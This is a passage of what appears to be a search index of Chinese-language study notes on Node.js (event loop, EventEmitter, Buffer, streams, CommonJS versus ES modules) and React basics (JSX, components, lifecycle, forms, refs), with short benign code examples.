是单进程单线程应用程序，那么它是如何实现异步调用的呢？\n它维护了六个 FIFO 队列，分别表示不同的功能的函数：\n ┌───────────────────────────┐ ┌─\u0026gt;│ timers │ │ └─────────────┬─────────────┘ │ ┌─────────────┴─────────────┐ │ │ pending callbacks │ │ └─────────────┬─────────────┘ │ ┌─────────────┴─────────────┐ │ │ idle, prepare │ │ └─────────────┬─────────────┘ ┌───────────────┐ │ ┌─────────────┴─────────────┐ │ incoming: │ │ │ poll │\u0026lt;─────┤ connections, │ │ └─────────────┬─────────────┘ │ data, etc. │ │ ┌─────────────┴─────────────┐ └───────────────┘ │ │ check │ │ └─────────────┬─────────────┘ │ ┌─────────────┴─────────────┐ └──┤ close callbacks │ └───────────────────────────┘ 然后它的单线程只执行一个 while 循环，一直跑这六个的头部任务，直到队列为空或者执行时间到达上限。\n每个阶段执行的功能如下：\n  timer：这个阶段执行通过 setTimeout() 和 setInterval() 设置的回调函数；\n  I/O callback：执行延迟到下一个循环迭代的 I/O 回调；\n  idle,prepare：系统调用，也就是 liuv 调用；\n  poll：轮询阶段，检测新的 I/O 事件，执行与 I/O 相关的回调（几乎所有的回调都是关闭回调，定时器调度的回调，以及 setImmaditate()），node会在此阶段适当的阻塞\n  check：此阶段调用 setImmadiate() 设置的回调\n  close callbacks：一些关闭回调，比如说 socket.on('close',...)\n  在每个队列阶段处理完之后，并不是直接进入下一阶段，而是会处理一些中间队列：\n 有 4 个主要类型的队列，被原生的 libuv 事件循环处理。  过期计时器和间隔队列（Expired timers and intervals Queue）：实际是最小堆存储； IO 事件队列（IO Events Queue）：完成的 I/O 事件； 立即执行的队列（Immediate Queue）：使用 setImmediate 函数添加的回调； 关闭操作队列（Close Handlers Queue）：任何一个 close 事件处理器。   除了四个主要的队列，这里另外有两个被 Node 上层处理的队列：  下一个运转队列（Next Ticks Queue）：使用 process.nextTick() 函数添加的回调 其他的微队列（other Microtasks Queue）：包含其他的微队列如成功的 Promise 回调    事件循环给了 nodejs 这些特性：\n  Node.js 几乎每一个 API 都是支持回调函数的。\n  这些接口可以处理大量的并发，所以性能非常高。\n  Node.js 基本上所有的事件机制都是用设计模式中观察者模式实现。\n  事件驱动程序 #  Node.js 使用事件驱动模型，当 web server 接收到请求，就把它关闭然后进行处理，然后去服务下一个 web 请求。当这个请求完成，它被放回处理队列，当到达队列开头，这个结果被返回给用户。\n这个模型非常高效可扩展性非常强，因为 webserver 一直接受请求而不等待任何读写操作。（这也称之为非阻塞式 IO 或者事件驱动 IO）\n在事件驱动模型中，会生成一个主循环来监听事件，当检测到事件时触发回调函数。\n整个事件驱动的流程就是这么实现的，非常简洁。有点类似于观察者模式，事件相当于一个主题 (Subject)，而所有注册到这个事件上的处理函数相当于观察者 (Observer)。\nNode.js 有多个内置的事件，我们可以通过引入 events 模块，并通过实例化 EventEmitter 类来绑定和监听事件，如下实例：\n// 引入 events 模块 var events = require(\u0026#39;events\u0026#39;); // 创建 eventEmitter 对象 var eventEmitter = new events.EventEmitter(); 以下程序绑定事件处理程序：\n// 绑定事件及事件的处理程序 eventEmitter.on(\u0026#39;eventName\u0026#39;, eventHandler); 我们可以通过程序触发事件：\n// 触发事件 eventEmitter.emit(\u0026#39;eventName\u0026#39;); "},{"id":328,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/nodejs/6.eventemitter/","title":"6. Event Emitter","section":"nodejs","content":" 参考：\n https://www.runoob.com/nodejs/nodejs-event.html   EventEmitter #  Node.js 所有的异步 I/O 操作在完成时都会发送一个事件到事件队列。\nNode.js 里面的许多对象都会分发事件：一个 net.Server 对象会在每次有新连接时触发一个事件， 一个 fs.readStream 对象会在文件被打开的时候触发一个事件。\n所有这些产生事件的对象都是 events.EventEmitter 的实例。\n它被定义在 events，这个模块中：\nvar events = require(\u0026#39;events\u0026#39;); 这个模块只定义了一个对象 events.EventEmitter，它的核心就是事件触发与事件监听器功能的封装：\nvar eventEmitter = new events.EventEmitter(); 下面一个简单的例子阐述事件的监听和出发过程：\n//event.js 文件 var events = require(\u0026#39;events\u0026#39;); var emitter = new events.EventEmitter(); emitter.on(\u0026#39;someEvent\u0026#39;, function(arg1, arg2) { console.log(\u0026#39;listener1\u0026#39;, arg1, arg2); }); emitter.on(\u0026#39;someEvent\u0026#39;, function(arg1, arg2) { console.log(\u0026#39;listener2\u0026#39;, arg1, arg2); }); emitter.emit(\u0026#39;someEvent\u0026#39;, \u0026#39;strArg1\u0026#39;, \u0026#39;strArg2\u0026#39;); $ node events.js listener1 strArg1 strArg2 listener2 strArg1 strArg2 有关这个库更详细的接口，可以参考官方文档\n"},{"id":329,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/nodejs/7.buffer/","title":"7. Buffer","section":"nodejs","content":" 参考：\n https://www.runoob.com/nodejs/nodejs-buffer.html   Buffer #  概述 #  JavaScript 语言自身只有字符串数据类型，没有二进制数据类型。因此在 Node.js 中，定义了一个 Buffer 类，该类用来创建一个专门存放二进制数据的缓存区。一个 Buffer 类似于一个整数数组，但它对应于 V8 堆内存之外的一块原始内存。\n下面介绍一些常见的用法。完整的请参考官方文档。\n编码与解码 #  将字符串转化为二进制数据的过程叫编码：\nconst buf = Buffer.from(\u0026#39;runoob\u0026#39;, \u0026#39;ascii\u0026#39;); 将二进制数据转化为字符串的过程叫解码：\nconsole.log(buf.toString(\u0026#39;hex\u0026#39;));\t// 输出 72756e6f6f62 Node.js 目前支持的字符编码包括：\n ascii：仅支持 7 位 ASCII 数据。如果设置去掉高位的话，这种编码是非常快的。 utf8：多字节编码的 Unicode 字符。许多网页和其他文档格式都使用 UTF-8 。 utf16le/ucs2：2 或 4 个字节，小字节序编码的 Unicode 字符。支持代理对（U+10000 至 U+10FFFF）。 base64：Base64 编码。 latin1/binary：一种把 Buffer 编码成一字节编码的字符串的方式。 hex：将每个字节编码为两个十六进制字符。  创建 Buffer 类 #  Buffer 提供了以下 API 来创建 Buffer 类：\nBuffer.alloc(size[, fill[, encoding]]); // 返回一个指定大小的 Buffer 实例，如果没有设置 fill，则默认填满 0  Buffer.allocUnsafe(size); // 返回一个指定大小的 Buffer 实例，但是它不会被初始化，所以它可能包含敏感的数据  Buffer.allocUnsafeSlow(size); // 这个方法比调用 Buffer.alloc() 更快 // 但返回的 Buffer 实例可能包含旧数据，因此需要使用 fill() 或 write() 重写。  Buffer.from(array); // 返回一个被 array 的值初始化的新的 Buffer 实例（传入的 array 的元素只能是数字，不然就会自动被 0 覆盖）  Buffer.from(arrayBuffer[, byteOffset[, length]]); // 返回一个新建的与给定的 ArrayBuffer 共享同一内存的 Buffer。  Buffer.from(buffer); // 复制传入的 Buffer 实例的数据，并返回一个新的 Buffer 实例  Buffer.from(string[, encoding]); // 返回一个被 string 的值初始化的新的 Buffer 实例 "},{"id":330,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/nodejs/8.stream/","title":"8. Stream","section":"nodejs","content":"Stream #  概述 #  Stream 是一个抽象接口，Node 中有很多对象实现了这个接口。例如，对 http 服务器发起请求的 request 对象就是一个 Stream，还有 stdout（标准输出）也是一个 Stream。\nNode.js，Stream 有四种流类型：\n Readable：可读操作。 Writable：可写操作。 Duplex：可读可写操作. Transform：操作被写入数据，然后读出结果。  所有的 Stream 对象都是 EventEmitter 的实例。常用的事件有：\n data：当有数据可读时触发。 end：没有更多的数据可读时触发。 error：在接收和写入过程中发生错误时触发。 finish：所有数据已被写入到底层系统时触发。  从流中读取数据 #  读取的基本方法是：通过监听 data 事件，数据会在回调函数的参数中回传。\n一个示例程序如下：\nvar fs = require(\u0026#34;fs\u0026#34;); var data = \u0026#39;\u0026#39;; var readerStream = fs.createReadStream(\u0026#39;test.txt\u0026#39;); readerStream.setEncoding(\u0026#39;UTF8\u0026#39;); // 处理流事件 --\u0026gt; data, end, and error readerStream.on(\u0026#39;data\u0026#39;, chunk =\u0026gt; { data += chunk; }); readerStream.on(\u0026#39;end\u0026#39;, () =\u0026gt; { console.log(data); }); readerStream.on(\u0026#39;error\u0026#39;, err =\u0026gt; { console.log(err.stack); }); console.log(\u0026#34;Done!!\u0026#34;); $ node readstream.js Done!! laji shesl's test case 向流中写入数据 #  写入的基本方法是调用 write 方法。\n一个示例程序如下：\nvar fs = require(\u0026#34;fs\u0026#34;); var data = \u0026#34;laji shesl\u0026#39;s test case\u0026#34;; var writerStream = fs.createWriteStream(\u0026#39;test.txt\u0026#39;); // 处理流事件 --\u0026gt; data, end, and error writerStream.on(\u0026#39;finish\u0026#39;, () =\u0026gt; { console.log(\u0026#34;Finish.\u0026#34;); }); writerStream.on(\u0026#39;error\u0026#39;, (err) =\u0026gt; { console.log(err.stack); }); writerStream.write(data,\u0026#39;UTF8\u0026#39;); writerStream.end(); console.log(\u0026#34;Done!!\u0026#34;); $ node writestream.js Done!! Finish. 查看内容：\n$ cat test.txt laji shesl\u0026#39;s test case% 管道流 #  这里的管道，与 Unix 设计思想中的管道概念是相同的。它将输入流发送给输出流。\n示例程序如下：\nvar fs = require(\u0026#34;fs\u0026#34;); var readerStream = fs.createReadStream(\u0026#39;input.txt\u0026#39;); var writerStream = fs.createWriteStream(\u0026#39;output.txt\u0026#39;); // 管道读写操作 // 读取 input.txt 文件内容，并将内容写入到 output.txt 文件中 readerStream.pipe(writerStream); console.log(\u0026#34;Done!!!\u0026#34;); 链式流 #  简单的说链式流就是连续调用管道流，就如同 Unix 中的命令一样。它之所以可以这么做就等同于 C++ 中 \u0026lt;\u0026lt; 的返回值原理是一样的。\n下面是压缩和解压缩的程序的例子：\nvar fs = require(\u0026#34;fs\u0026#34;); var zlib = require(\u0026#39;zlib\u0026#39;); // 压缩 input.txt 文件为 input.txt.gz fs.createReadStream(\u0026#39;input.txt\u0026#39;) .pipe(zlib.createGzip()) .pipe(fs.createWriteStream(\u0026#39;input.txt.gz\u0026#39;)); console.log(\u0026#34;File compose done!!\u0026#34;); var fs = require(\u0026#34;fs\u0026#34;); var zlib = require(\u0026#39;zlib\u0026#39;); // 解压 input.txt.gz 文件为 input.txt fs.createReadStream(\u0026#39;input.txt.gz\u0026#39;) .pipe(zlib.createGunzip()) .pipe(fs.createWriteStream(\u0026#39;input.txt\u0026#39;)); console.log(\u0026#34;File decompose done!!\u0026#34;); "},{"id":331,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/nodejs/9.%E6%A8%A1%E5%9D%97%E7%B3%BB%E7%BB%9F/","title":"9.模块系统","section":"nodejs","content":"模块系统 #  概述 #  为了让 Node.js 的文件可以相互调用，Node.js 提供了一个简单的模块系统。\n模块是 Node.js 应用程序的基本组成部分，文件和模块是一一对应的。换言之，一个 Node.js 文件就是一个模块，这个文件可能是 JavaScript 代码、JSON 或者编译过的C/C++ 扩展。\n创建模块 #  创建一个模块非常简单，举个例子。\n创建一个叫 hello 的模块，只需要创建 hello.js 文件，代码如下：\nexports.world = () =\u0026gt; { console.log(\u0026#39;Hello World\u0026#39;); } 这样，其他文件包含这个文件时，就可以访问到 world 这个函数了。\n如果我们希望直接封装一个对象，可以直接给 module.exports 这个变量赋值。比如：\nfunction Hello() { var name; this.setName = thyName =\u0026gt; { name = thyName; }; }; module.exports = Hello; js 模块的编译在编译的过程中，Node 对获取的 javascript 文件内容进行了头尾包装，将文件内容包装在一个 function 中：\n(function (exports, require, module, __filename, __dirname) { //...  return module.exports; }) 文件模块与原生模块 #  核心（原生）模块是指那些随 Node.js 安装而安装的模块，这些模块在 Node.js 源代码编译时被编译成二进制执行文件。相比文件模块，核心（原生）模块的加载速度更快。\n可以参考，其他人整理的原生模块列表。\n文件模块的文件名有三种表示方式：/ 绝对路径、./ 调用 require 函数文件的位置、直接使用模块名会寻找 node_module 与核心模块。\n查找的优先级顺序如下图所示：\n"},{"id":332,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/nodejs/nodemodules/","title":"Node Modules","section":"nodejs","content":" 参考：\n https://www.zhihu.com/question/62791509 https://redfin.engineering/node-modules-at-war-why-commonjs-and-es-modules-cant-get-along-9617135eeca1   Commonjs vs ES Modules #  What’s CJS? What’s ESM? #  在 Node 模块的早期，所有的 Node Module 都是用 Common.js 编写的。我们可以从 named export 与 default export 两种方式简单地了解它的使用规则：\n named export：  // @filename: util.cjs module.exports.sum = (x, y) =\u0026gt; x + y; // @filename: main.cjs const {sum} = require(\u0026#39;./util.cjs\u0026#39;); default export：  // @filename: util.cjs module.exports = (x, y) =\u0026gt; x + y; // @filename: main.cjs const whateverWeWant = require(\u0026#39;./util.cjs\u0026#39;); console.log(whateverWeWant(2, 4)); 在 ES Module 中，import 和 export 关键字则是语言的一部分：\n named export：  // @filename: util.mjs export const sum = (x, y) =\u0026gt; x + y; // @filename: main.mjs import {sum} from \u0026#39;./util.mjs\u0026#39; console.log(sum(2, 4)); default export：  // @filename: util.mjs export default (x, y) =\u0026gt; x + y; // @filename: main.mjs import whateverWeWant from \u0026#39;./util.mjs\u0026#39; console.log(whateverWeWant(2, 4)); Loader Machanism #  common.js 的加载机制相当简单：\n common.js 中的关键词 require 是同步的，它并不会返回一个 Promise 对象或使用 callback 作为参数。它简单地从磁盘或网络中获取对应的 js 脚本，然后直接运行这个脚本，返回设置在 module.exports 上的变量；  ES Module 的加载机制则可以分为三个步骤：\n 加载器简单地分析 import 和 export 语句分析每个文件的引用和导出关系； 所有的无依赖关系的姊妹文件同步地从磁盘或网络加载； 通过第一步中分析得到的关系，构建出一个依赖关系图，并且自底向上地执行，直到这个找到这个图中的一个节点并没有对其他任何模块有引用关系；  Inter-Invocation #  common.js 通常是模块（比如浏览器的 \u0026lt;script\u0026gt; 标签）的默认策略：因为 ES Module 相对于 common.js 改变了许多策略。\n将模块从 ES Module 迁移到 common.js 将会对兼容性造成很大损害（Deno 就是一个完全使用 ES Module 的 JavaScript 运行时，与之相应的，它的生态也需要从头开始建立）。\nCJS can\u0026rsquo;t requre ESM #  因为 ESM 支持顶级 await 语句（即在任何一个 async 函数之外使用 await 语句，这是因为之前提及的 ES Module 使用多阶段加载机制），但是 CJS 不支持。\nRich Harris 在这篇文章中提出了一系列的原因以表达不支持 JavaScript 语言不应该支持顶级 await 语句：\n 顶级 await 会阻碍代码的执行；会阻碍资源的获取；commonjs 没有与之对应的操作。  ES Module 的第三次提案阐明了这些问题：\n 姊妹模块可以同时执行，并没有阻碍无须等待的代码；资源的获取在第二步，也就是 await 操作执行之前；await 语句仅仅限于被 ES Module 使用，没有必要考虑 commonjs 对应的操作；  在 nodejs/module 的 issue 中现在还活跃着有关是否应该在 ES Module 中支持 require 的讨论，你会发现顶级 await 并不唯一的问题。\nCJS can import ESM #  commonjs 可以通过以下不完美的方式从 ES Module 导入对应的函数：\nmodule.exports.foo = (async () =\u0026gt; { const {foo} = await import(\u0026#39;./foo.mjs\u0026#39;); return foo; })(); ESM can\u0026rsquo;t import named CJS #  ESM 可以通过以下的方式导入 CJS 中的默认导出（但是无法导入命名导入）：\nimport _ from \u0026#39;./lodash.cjs\u0026#39;; 这是因为之前提到的 CJS 只有在脚本执行后才可以明确它导出的内容，而 ESM 需要在分析阶段。但是我们可以用以下的方式导入：\nimport _ from \u0026#39;./lodash.cjs\u0026#39;; const {shuffle} = _; 解决这个问题有很多思路，但是都有很强的副作用：\n  忽略顺序，将所有的 CJS 模块在 ESM 前执行，这样我们就能在 ESM 的分析阶段得到 CJS 的导出结果。但是这产生了新问题，如果模块有明显的先后关系，则这种解决方式将导致令人作呕的 bug（nauseatingly problematic）；\n  我们可以保持顺序，还有另一种解决方案的提案，叫做 \u0026ldquo;动态模块\u0026quot;。这种解决方案使得 ESM 可以使用如 export * from './foo.cjs' 这样的语法进行导出。但是这个提案因为种种原因被拒绝了。\n  ESM can require CJS #  ESM 可以通过以下的方式非常轻松地从 CJS 中 require：\nimport { createRequire } from \u0026#39;module\u0026#39;; const require = createRequire(import.meta.url); const {foo} = require(\u0026#39;./foo.cjs\u0026#39;); 虽然这么做非常完美，但是相对于之前的 import 更麻烦，没有必要这么做。\nAwareness In Use #  在使用时我们需要注意以下的一些区别：\n  CJS 输出的是一个值的拷贝，ESM 输出的是值的引用。\n  CJS 是运行时加载，ESM 是编译时输出接口；\n  CJS 是单个值导出，ESM 可以导出多个；\n  CJS 是动态语法可以写在判断里，ESM 静态语法只能写在顶层；\n  CJS 的 this 指向当前模块，ESM 的 this 是 undefined；\n  "},{"id":333,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/proxy/","title":"Proxy","section":"JavaScript","content":" 参考资料：\n https://zhuanlan.zhihu.com/p/75407419 https://zhuanlan.zhihu.com/p/69106037   Proxy #  实例 #  直接看一个例子：\nlet target = { x: 10, y: 20, }; let hanler = { get: (obj, prop) =\u0026gt; 42 }; target = new Proxy(target, hanler); target.x; //42 target.y; //42 "},{"id":334,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/reactjs/1.react%E5%9F%BA%E7%A1%80/","title":"1. React基础","section":"reactjs","content":"React 基础 #  从原生到 React #  原生例子 #  一个 demo，如何用原生的 JavaScript 实现一个点赞按钮（即简单的点击一次更换一次图片）。\n// 将点赞按钮可复用地组件化 class LikeStar { constructor() { this.state = { isLiked: false; } this.redStarSrc = URL_OF_RED_STAR; this.whiteStarSrc = URL_OF_WHITE_STAR; } changeStar = () =\u0026gt; { this.state.isLiked = !this.state.isLiked; const imgSrc = this.state.isLiked ? this.redStarSrc : this.whiteStarSrc; const $star = this.el.querySelector(\u0026#39;.js-star\u0026#39;);\t// 其中 js-star 是 img 标签的一个 class  $star.setAttribute(\u0026#39;src\u0026#39;, imgSrc); } render() { this.el = createDOMFromString(`\u0026lt;img class=\u0026#34;js-star\u0026#34;\u0026gt; src=\u0026#34;${this.whiteStarSrc}\u0026#34;`); this.el.addEventListener(\u0026#39;click\u0026#39;, this.changeStar, false); return this.el; } } // 如何使用刚才定义的 LikeStar 类 $wrapper.apppendChild(new LikeStar().render()); 上面的例子使用了 setAttribute、createDOMFromString、addEventListener 这些原生的 js 方法，实现了一个 demo。\n原生存在的问题 #  上面直接使用原生的方法实现的例子存在这样一些问题：\n 复用性不是特别强：组件没有提供传入参数定制化的能力，复用性不强。 DOM 操作与组件方法耦和在一起：当我们的组件越来越复杂时，需要在组件内维护 DOM 的成本会越来越大，同时直接操作 DOM 也会有许多性能问题；它同时也是复用性不强的一种具体体现；  第一个问题是比较好解决的，直接在 class 的构造方法中加入一个 props 参数即可。\n对于第二个问题，我们则需要通过一定的抽象，将与 DOM 相关的操作从 LikeStar 中剥离出来：\nclass DOMOperator { constructor(props) { this.state = {}; this.props = props || {}; } setState = state =\u0026gt; { this.state = state; const oldEle = this.el; this.el = this.renderDOM() this.updateUI \u0026amp;\u0026amp; this.updateUI(oldEle, this.el); } renderDOM = () =\u0026gt; { this.el = createDOMFromString(this.render()); this.onClick \u0026amp;\u0026amp; this.el.addEventListener(\u0026#39;click\u0026#39;, this.onClick, false); return this.el; } } class LikeStar extends DOMOperator { constructor(props) { super(props); this.state = { isLiked: false; } } onClick = () =\u0026gt; { this.setState({ isLiked: !this.state.isLiked }) } render() { const { isLiked } = this.state; const { className } = this.props; const imgSrc = isLiked ? URL_OF_RED_STAR : URL_OF_WHITE_STAR; return createDOMFromString(`\u0026lt;img class=\u0026#34;js-star ${className}\u0026#34;\u0026gt; src=\u0026#34;${imgSrc}\u0026#34;`); } } const renderDOM = (instance, $parentDOM) =\u0026gt; { instance.updateUI = (oldEle, newEle) =\u0026gt; { $parentDOM.insertBefore(newEle, oldEle); $parentDOM.removeChild(oldEle); } $parentDOM.appendChild(instance.renderDOM()); } renderDOM( new LikeStar(), $wrapper ); 上面的例子通过将 setState 与 updateDOM 沉淀到基类中实现了一个 DOM 与组件隔离的设计模式。对于上面的设计模式，我们可以认为 UI 的一个更新流程的抽象过程：\n 更新状态 setState =\u0026gt; 更新抽象的 DOM =\u0026gt; 更新 UI；  React 例子 #  同样的例子，用 React 是如何实现的呢？\nclass LikeStar extends React.Component { constructor(props) { super(props); this.state = { isLiked: false }; } onClick = () =\u0026gt; { this.setState(prev =\u0026gt; ({ isLiked: !prev.isLiked })); } render() { const { isLiked } = this.state; const { className } = this.props; const imgSrc = isLiked ? URL_OF_RED_STAR : URL_OF_WHITE_STAR; return ( \u0026lt;img className={\u0026#39;heart \u0026#39; + className} onClick={this.onClick} src={imgSrc} /\u0026gt; ); } } 而最后抽象出来的 renderDOM 方法则是由一个叫 ReactDOM 的第三方库实现的：\nReactDOM.render( \u0026lt;LikeStar /\u0026gt;, $wrapper ); 可以看到这个例子就与我们在第二个部门中优化后的代码几乎是一致的了，也就是说，React 相对于原生代码解决了以下的问题：\n 使用面向对象的组件化的方式项目化地组织代码结构； 通过使用 props、state 这两个核心技术，实现组件的多态性，提高代码的复用性； 将 DOM 操作与组件的逻辑通过 setState 这个方法解耦，这个是 React 设计的核心优点，它有以下好处：  解决了当组件过于庞大时大量处理 DOM 的问题，提高了代码的维护性； React.js 底层通过虚拟 DOM 的方式提高了 DOM 渲染的性能； 提供了一个组件的设计范式，优化了代码的编写方式；   通过定义 jsx 语法，实现 js/html 的高效嵌套编写（本质是 React.createElement 的语法糖）；  简介 #  什么是 React.js？\n React 是一个声明式，高效且灵活的用于构建用户界面的 JavaScript 库。 不同于框架，框架提供了一整套的解决方案，而 React 的定位只是一个轻量库。 React.js 只有与 Redux、react-router 合起来才能称为一个框架。  React.js 的特点：\n  声明式的视图层：声明式侧重于描述一个组件的特点，而传统的命令式则侧重于具体的实现过程；\n  简单的更新流程：只需要调用 setState 即可，也就说 React 实现了数据更新到 UI 更新的单向更新机制；\n  灵活的渲染实现：React.js 通过虚拟 DOM 作为视图组件到 UI 的中介，React 不关心 虚拟 DOM 到更新 UI 的具体实现，这一过程需要通过第三方库具体地实现。比如：react-dom 用于浏览器渲染、React-Native 用于手机终端渲染；\n  高效的 DOM 操作：只操作 虚拟 DOM（一个 JavaScript 对象） 而非具体的 DOM，优异的 DOM diff 算法。\n  基本概念 #  jsx 语法 #  标签类型：\n DOM 类型标签（首字母必须小写开头）：React.js 为了优化开发体验，使用了原生的 DOM 标签进行定义。实际上在 React.js 底层进行了一层处理； React 组件类型标签（首字母必须大写开头）：jsx 使用不同的处理方式，因此需要于上者严格区分。  jsx 中的 JavaScript 表达式：\n 可以通过表达式给标签赋值，可以通过表达式定义子组件（比如定义循环）； 需要注意的一点是 jsx 是不支持多行表达式的，因此需要将表达式抽象成一个方法出来；  DOM 标签属性：\n class =\u0026gt; className：为了避免与 ES6 的 class 发生冲突，DOM 中的 class 关键字在 React 中被命名为 className。 onclick =\u0026gt; onClick：为了保持编码风格的一致性，都改名为驼峰的命名方式，同理还有 onFocus、onBlur 等； 自定义标签属性：取决于组件的 props。PS：在 jsx 中使用 'str' 与 {'str'} 定义字符串都是合法的，建议使用前者；  组件 #  组件的类型：\n 类组件（使用 ES6 的 class 语法），函数组件（接收 props 作为参数，返回一个 ReactNode，注意首字母需要大写）； 建议有状态组件使用类组件的定义方式，无状态组件使用函数组件的定义方式。  props 属性的校验：\n React.Component 支持对 props 进行校验（校验结果是在控制台抛出 warning），校验的方式是通过定义一个 static 的成员对象 propTypes，React 支持的所有组件都定义在一个叫 prop-types 的第三方库中。 另外，我们还可以通过定义 static 的成员对象 defaultProps 给每个 prop 赋予一个默认值。  下面给出一个 props 属性校验的例子：\nimport PropTypes from \u0026#39;prop-types\u0026#39; class CommentItems extends React.Component { static propTypes = { userImg: PropTypes.string.isRequired, // 必选字符串项  likeIcon: PropTypes.number,\t// 数字类型  } static defaultProps = { userImg: \u0026#39;\u0026#39;, likeIcon: 0, } } state 更新：\n state 更新不能直接赋值，需要使用 setState 方法进行更新； setState 方法有两种调用方式，一种是直接传入对象，一种是传入以 (prevState, props) 为函数的一个参数； setState 调用后并不会立即更新，而是在一个组件生命之后将所有更改批量更新，函数的第二个参数就是 callback 函数。  组件样式的编写：\n React 提供了使用 className（可以使用第三方库 classnames） 和 css-in-js 两种方式对组件样式进行更新； 官方推荐使用 className 这种简单方式进行样式编写，css-in-js 应该只在特定场景下使用；  元素 #  元素：\n 元素是 React 中最小的组成单元，它直接描述了希望看到的内容，可以通过第三方库直接渲染成一个 DOM 元素； React 中的元素是不可变对象，这意味着它和它的子元素都是不可变的，在更新时使用创建一个新的元素的策略进行更新；  组合和元素（React.Component 与 React.Element）：\n 组件最核心的作用是返回 React 元素。 class 类型的组件中的 render 方法返回的就是元素，function 本身返回的也是元素。  一个区别二者的例子：\n\u0026lt;Parent\u0026gt; \u0026lt;Children\u0026gt;我是子组件\u0026lt;/Children\u0026gt; \u0026lt;/Parent\u0026gt; 我们知道 children 会被持有在 parent 的 props 中：\nimport Children from \u0026#39;./Children\u0026#39; class Parent extends React.Component { /* 正确的编写方式 1 */ render() { const { tip } = this.props; return \u0026lt;Children tip={tip} /\u0026gt;\t/// =\u0026gt; 因为 Children 是组件  } /* 错误的编写方式 2 */ render() { const { tip, children } = this.props; return \u0026lt;children tip={tip} /\u0026gt;\t/// =\u0026gt; 因为 children 是元素  } /* 正确的编写方式 3 */ render() { const { tip, children } = this.props; return React.cloneElement(children, { tip }); } } 生命周期与事件处理 #  挂载阶段 #  下述方法从上往下以此调用：\n   方法 一般作用 调用时机与效果     constructor(props) 1. state 的初始化，直接赋值而非使用 setState；\n2. 通过 bind 进行方法绑定； ES6 class 的初始化方法   static getDerivdStateProps(props, state) =\u0026gt; obj or null 让组件在 props 变化时更新 state。 每次执行渲染前都会调用。\n如果返回值设为 obj 那么执行之后组件的 state 会被设置为 {...this.state, ...obj}；   render：唯一必须要实现的方法。 描述希望在页面上看到的 UI 效果 返回类型：元素、数组/fragments、Porrtals、字符串或数值、布尔型或 null。   componentDidMount 1. 依赖于 DOM 节点的初始化的任务；\n2. 需要通过网络请求获取数据； 在组件挂载（即插入 DOM 树）之后立即调用。    更新阶段 #  组件的更新需要外部的触发，一般有以下三种方式：props 更新、setState 方法调用、forceUpdate 方法调用。\n在组件更新触发时，下面的方法从上往下依次调用：\n   方法 一般作用 调用时机与效果     static getDerivdStateProps(props, state) =\u0026gt; obj or null  注意参数是更新之后的值   shouldComponentUpdate(nextProps, nextState) =\u0026gt; bool 决定组件是否继续执行更新过程 返回的值如果是 false，则组件不会继续执行后续函数的更新过程（forceUpdate 时会跳过这个函数的执行）   render     getSnapshotBeforeUpdate(prevProps, prevState) =\u0026gt; snapshot or null 需要在更新 DOM 前保存当前 DOM 一些状态值时使用 在最近一次渲染输出（即提交到 DOM 节点）前调用   componentDidUpdate(prevProps, prevState, snapshot) =\u0026gt; void 对更新后的 DOM 进行操作 在更新后会被立即调用    卸载阶段 #  执行一个 componentWillUnmount 方法。\n事件处理 #  React 事件与原生 DOM 事件：\n React 事件命名统一使用小驼峰式，而不是纯小写； React 事件在 jsx 语法中需要传入一个 js 的函数而不是一个字符串； React 中的事件时合成事件，并不是原生的 DOM 事件，如有需要，可以使用 e.nativeEvent 访问； 要阻止事件的默认行为，在 React 中必须显示地调用 preventDefault 方法；  this 的处理：ES6 并不会将函数自动绑定到当前定义的对象中，因此在使用需要调用 this 的函数作为事件处理函数时，需要对 this 进行特殊的处理。React 中主要有以下三种处理方式：\n 箭头函数，比如：(e) =\u0026gt; this.handleEvent(e)； 函数绑定，在 constructor 中将函数通过 bind 函数绑定到当前对象，比如：this.handleEvent = this.handleEvent.bind(this)； class field 还处于草案阶段，需要引入 babel 的插件，比如 handleEvent = () =\u0026gt; {}；  列表与表单 #  列表 #  React 使用 key 属性来标记列表中的每个元素，当列表数据发生变化时，React 就可以通过 key 知道哪些元素发生了变化，从而只渲染发生变化的元素，提高渲染效率。\nkey 的制定原则：\n key 应该放在就近的数组上下文中，指定给最上层的标签的属性； 数组元素中使用 key 只在其兄弟节点中是独一无二的； 不建议使用索引来作为 key 值，因为这样会导致性能变差，还可能引起组件状态问题；  受控表单 #  一个表单的值是由 React 来进行管理的，那么它就是一个受控组件。\n具体实现：\nclass NameForm extends React.Component { // ...  handleChange = event =\u0026gt; { this.setState({ value: event.target.value }); } // ...  render() { return ( \u0026lt;input onChange={this.handleChange} /\u0026gt;\t/* 交由 NameForm 处理 */ ); } } 非受控表单 #  如果一个表单的状态仍然由表单元素自己管理，而不是交给 React.js 组件管理，那么他就是一个非受控组件。\n下面是一个非受控组件的例子：\nclass FlavorForm extends React.Component { constructor (props) { // ...  this.inputMangoRef = React.createRef(); } handleSubmit = event =\u0026gt; { event.preventDefault(); // ...  console.log(this.inputMangoRef.current.checked); } render () { return ( \u0026lt;form onSubmit={this.handleSubmit}\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; value=\u0026#34;mango\u0026#34; name=\u0026#34;mango\u0026#34; ref={this.inputMangoRef} /\u0026gt; \u0026lt;/form\u0026gt; ) } } refs #  Refs 是 React 中访问 DOM 节点，获取 render 方法中创建的 React 元素的一种方法。\nRefs 有以下两种使用方式：\n React.createRef：上面“非受控表单”的例子就是使用的这种方式进行创建的； 回调函数：给 ref 属性值设置为一个函数，它会以 ref 为参数调用这个函数（注意：如果是以匿名函数的方式定义这个函数，那么每次更新时他会被执行两次，其中第一次是 null，所以为出于性能考虑不建议这么定义）  注意事项：\n 函数组件不能使用 refs； 切勿过度使用 refs；  "},{"id":335,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/reactjs/2.react%E8%BF%9B%E9%98%B6/","title":"2. React进阶","section":"reactjs","content":"React 进阶 #  Context #  Context 是 React 